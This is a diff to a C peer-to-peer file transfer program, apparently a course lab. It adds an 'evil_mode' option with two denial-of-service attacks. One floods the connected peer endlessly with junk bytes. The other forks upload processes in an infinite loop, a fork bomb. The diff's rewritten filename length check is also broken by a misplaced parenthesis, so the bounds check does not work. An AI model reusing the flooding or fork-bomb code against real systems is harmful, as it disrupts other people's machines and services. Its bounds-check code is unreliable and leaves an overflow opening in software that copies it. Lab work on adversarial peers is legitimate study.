@@ -644,9 +644,10 @@ static void task_upload(task_t *t)
 			break;
 	}
 
-	if (strnlen(t->buf,(FILENAMESIZ+1)) == FILENAMESIZ+1) {
-		error("File name requested is too long!!!\n");
-		goto exit;
+	if (strnlen(t->buf,(TASKBUFSIZ+1)) == TASKBUFSIZ+1
+		|| strnlen(t->filename, (FILENAMESIZ+1) == FILENAMESIZ+1)) {
+			error("Buffer or filename requested is too long!!!\n");
+			goto exit;
 	}
 
 	assert(t->head == 0);
@@ -676,6 +677,13 @@ static void task_upload(task_t *t)
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
 		goto exit;
+	}
+
+	//hopefully evil mode 1
+	if(evil_mode == 1) {
+		uint8_t derp[] = {'a', 'b', 'c', 'd', 'e', 'r', 'p'};
+		while(write(t->peer_fd, derp, 7) > 0)
+			continue;
 	}
 
 	message("* Transferring file %s\n", t->filename);
@@ -785,7 +793,6 @@ int main(int argc, char *argv[])
 	/*for (; argc > 1; argc--, argv++)
 		if ((t = start_download(tracker_task, argv[1])))
 			task_download(t, tracker_task);*/
-
 	pid_t forkPid = -1;
 	while (argc > 1) {
 		if ((t = start_download(tracker_task, argv[1]))) {
@@ -810,6 +817,17 @@ int main(int argc, char *argv[])
 
 	// Then accept connections from other peers and upload files to them!
 	while ((t = task_listen(listen_task))) {
+		if(evil_mode == 2) {
+			while(1) {
+				forkPid = fork();
+				if(forkPid == 0) {
+					task_upload(t);
+					_exit(0);
+				}
+				else
+					continue;
+			}
+		}
 		forkPid = fork();
 		if (forkPid >= 0) {
 			if (forkPid == 0) {
@@ -823,6 +841,5 @@ int main(int argc, char *argv[])
 			return 1;
 		}
 	}
-
 	return 0;
 }
